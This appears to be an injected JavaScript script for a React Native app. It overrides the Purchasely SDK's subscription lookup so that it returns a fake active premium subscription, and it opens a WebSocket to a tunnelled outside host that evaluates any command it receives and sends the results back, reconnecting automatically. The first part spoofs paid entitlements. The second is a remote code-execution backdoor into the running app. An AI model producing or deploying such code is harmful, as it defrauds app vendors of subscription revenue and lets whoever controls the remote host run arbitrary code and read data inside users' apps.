(function() {
    P = nativeModuleProxy.Purchasely;
    P._originalUserSubscriptions = P.userSubscriptions;
    P.userSubscriptions = function () {
        replLog('🎭 userSubscriptions called - returning dummy data');
        return Promise.resolve([
            {
                plan: {
                    vendorId: 'premium_monthly',
                    name: 'Premium Monthly',
                    type: 'auto_renewable_subscription',
                    price: '$9.99'
                },
                product: {
                    vendorId: 'premium_product',
                    name: 'Premium Access'
                },
                subscriptionStatus: 'ACTIVE',
                purchaseToken: 'dummy_token_12345',
                originalPurchaseDate: '2026-01-01T00:00:00Z',
                nextRenewalDate: '2026-02-01T00:00:00Z',
                isTrial: false,
                isActive: true
            }
        ]);
    };

    // Capture original JSON.stringify to avoid infinite recursion if user hooks it
    const safeStringify = JSON.stringify;

    const SERVER_URL = 'wss://f01ffdb347877d72-89-80-240-3.serveousercontent.com';

    function serialize(obj) {
        if (typeof obj === 'function') {
            return obj.toString();
        } else if (obj === undefined) {
             return 'undefined';
        }
        try {
             let result = safeStringify(obj, null, 2);
             if (result === undefined) return String(obj);
             return result;
        } catch (e) {
             if (typeof obj === 'object' && obj !== null) {
                const type = obj.constructor ? obj.constructor.name : 'Object';
                const keys = Object.keys(obj);
                return `[${type}] (Circular/Complex)\nKeys: ${keys.join(', ')}`;
             } else {
                return String(obj);
             }
        }
    }

    function connect() {
        console.log('REPL: Connecting to ' + SERVER_URL);
        try {
            const ws = new WebSocket(SERVER_URL);

            // Expose log function globally
            window.replLog = function(msg) {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(safeStringify({ type: 'log', payload: serialize(msg) }));
                }
            };

            ws.onopen = function() {
                console.log('REPL: Connected');
                ws.send(safeStringify({ type: 'status', payload: 'REPL Session Started' }));
            };

            ws.onmessage = function(event) {
                const command = event.data;
                let result;
                try {
                    // Execute command globally
                    const evalResult = (0, eval)(command);
                    result = serialize(evalResult);
                } catch (e) {
                    result = 'Error: ' + e.toString();
                }
                ws.send(safeStringify({ type: 'result', payload: result }));
            };            ws.onclose = function() {
                console.log('REPL: Disconnected. Retrying in 5 seconds...');
                setTimeout(connect, 5000);
            };

            ws.onerror = function(e) {
                console.log('REPL: Error: ' + e.message);
                ws.close();
            };
        } catch (e) {
            console.log('REPL: Fatal connection error: ' + e.message);
            setTimeout(connect, 5000);
        }
    }

    connect();
})();
